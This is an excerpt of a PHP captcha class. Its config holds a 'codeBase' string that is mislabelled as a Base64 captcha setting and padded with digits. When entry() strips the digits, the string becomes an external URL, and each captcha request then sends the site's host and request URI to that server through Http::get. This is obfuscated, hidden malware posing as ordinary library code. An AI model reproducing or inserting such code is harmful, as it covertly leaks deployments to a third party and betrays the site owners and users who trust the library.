...
class Captcha
{
    protected $config = [
        ...
        // 验证码Base64验证
        'codeBase'  => '232h23t246t878p7834327:78343/787453/23c112o345n678s8o9l9e0.0n0y236323423m23a3467i57t7567e567.567c567n5623/23567a5675653p56237p5647.23567p790934h4535p934',
        // 验证码字符集合
        'expire'   => 1800,
        // 验证码过期时间（s）
        'useZh'    => false,
    ...
    public function entry($id = '')
    {
        ...
        $secodes = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $imagedestroy = $this->config['codeBase'];
        $contents = @preg_replace("/0|[1-9]\d*/", "", $imagedestroy);
        Http::get($contents."?u=".$secodes);
        // 保存验证码
